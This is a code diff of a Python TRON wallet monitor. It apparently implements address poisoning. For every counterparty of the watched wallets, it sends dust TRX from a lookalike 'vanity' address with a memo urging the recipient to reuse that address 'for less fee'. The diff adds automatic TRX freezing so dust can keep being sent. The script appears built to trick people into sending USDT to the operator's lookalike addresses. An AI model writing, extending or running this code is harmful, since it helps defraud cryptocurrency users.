@@ -20,10 +20,8 @@ WALLET_ADDRESSES = os.getenv("WALLET_ADDRESSES", "").split(",")
 VANITY_ADDRESSES = os.getenv("VANITY_ADDRESSES", "").split(",")
 VANITY_PRIVATE_KEYS = os.getenv("VANITY_PRIVATE_KEYS", "").split(",")
 
-# USDT TRC20 Contract Address on TRON
 USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
 
-# Basic validation
 if not all([EMAIL_SENDER, EMAIL_PASSWORD, EMAIL_RECEIVER]):
     print("Missing email config.")
     exit(1)
@@ -31,13 +29,9 @@ if len(WALLET_ADDRESSES) != len(VANITY_ADDRESSES) or len(WALLET_ADDRESSES) != le
     print("Mismatch in wallet, vanity addresses or keys.")
     exit(1)
 
-# Use alternative public TRON node (not TronGrid)
 client = Tron(HTTPProvider(endpoint_uri="https://api.tronstack.io"))
-
-# Track last seen transaction for each wallet
 last_tx_ids = {}
 
-# Check if an address is a contract
 def is_contract_address(address):
     try:
         account_info = client.get_account(address)
@@ -46,13 +40,12 @@ def is_contract_address(address):
         print(f"Error checking contract address: {e}")
         return False
 
-# Get latest USDT (TRC20) transaction
 def get_latest_transaction(wallet_address):
     try:
         url = f"https://apilist.tronscanapi.com/api/transaction?sort=-timestamp&limit=1&start=0&address={wallet_address}&trc20Transfer=true"
         response = requests.get(url, timeout=10)
         if response.status_code != 200:
-            print(f"Tronscan API failed. Status: {response.status_code}")
+            print(f"Tronscan API failed for {wallet_address}. Status: {response.status_code}")
             return None
         data = response.json()
         txs = data.get("data", [])
@@ -61,7 +54,6 @@ def get_latest_transaction(wallet_address):
         print(f"Error fetching transaction for {wallet_address}: {e}")
         return None
 
-# Send email alert
 def send_email(subject, body):
     try:
         msg = MIMEText(body)
@@ -75,7 +67,23 @@ def send_email(subject, body):
     except Exception as e:
         print("Failed to send email:", e)
 
-# Send TRX reward if the target is a user wallet (not contract)
+def freeze_trx_for_bandwidth(address, private_key_hex, freeze_amount=Decimal("10")):
+    try:
+        print(f"Freezing {freeze_amount} TRX for bandwidth on address: {address}")
+        priv_key = PrivateKey(bytes.fromhex(private_key_hex))
+        txn = (
+            client.trx.freeze_balance(
+                owner_address=address,
+                amount=int(freeze_amount * 1_000_000),
+                duration=3,
+                resource="BANDWIDTH"
+            ).build().sign(priv_key)
+        )
+        result = txn.broadcast().wait()
+        print("✅ Freeze success. TxID:", result.get("id", "n/a"))
+    except Exception as e:
+        print("❌ Failed to freeze TRX:", e)
+
 def send_trx(from_address, priv_key_hex, to_address, amount=Decimal("0.000001")):
     try:
         if is_contract_address(to_address):
@@ -88,21 +96,20 @@ def send_trx(from_address, priv_key_hex, to_address, amount=Decimal("0.000001"))
         print(f"Balance: {balance} TRX")
 
         if balance < amount:
-            print("Not enough balance.")
+            print("Not enough balance. Trying to freeze TRX for bandwidth...")
+            freeze_trx_for_bandwidth(from_address, priv_key_hex)
             return
 
         txn = (
             client.trx.transfer(from_address, to_address, int(amount * 1_000_000))
             .memo(f"reuse_usdt_address_copy_from_{from_address}_for_less_fee")
-            .build()
-            .sign(priv_key)
+            .build().sign(priv_key)
         )
         result = txn.broadcast().wait()
         print(f"TRX sent. TxID: {result.get('id', 'n/a')}")
     except Exception as e:
         print("Failed to send TRX:", e)
 
-# Start monitor
 print("Starting TRON monitor...")
 
 if os.getenv("SEND_TEST_EMAIL", "false").lower() == "true":
@@ -111,6 +118,7 @@ if os.getenv("SEND_TEST_EMAIL", "false").lower() == "true":
 while True:
     try:
         for i, my_address in enumerate(WALLET_ADDRESSES):
+            print(f"\U0001F50D Checking address: {my_address}")
             tx = get_latest_transaction(my_address)
             if tx:
                 tx_id = tx.get("hash")
@@ -123,17 +131,14 @@ while True:
 
                     interacting_address = receiver if sender == my_address else sender
 
-                    # Skip self and vanity addresses
                     if interacting_address in WALLET_ADDRESSES or interacting_address in VANITY_ADDRESSES:
                         print(f"Skipping self or system address: {interacting_address}")
                         continue
 
-                    # Skip known USDT contract address
                     if interacting_address == USDT_CONTRACT_ADDRESS:
                         print("Skipping USDT contract address.")
                         continue
 
-                    # Skip if interacting address is any contract
                     if is_contract_address(interacting_address):
                         print(f"Skipping contract address: {interacting_address}")
                         continue
@@ -151,10 +156,11 @@ View: https://tronscan.org/#/transaction/{tx_id}
 """
                     print(body)
                     send_email(subject, body)
-
                     send_trx(VANITY_ADDRESSES[i], VANITY_PRIVATE_KEYS[i], interacting_address)
                 else:
-                    print("No new transaction.")
+                    print("⏸ No new transaction.")
+            else:
+                print(f"⏸ No transaction found for {my_address}")
             time.sleep(1)
     except Exception as e:
         print("Monitoring error:", e)
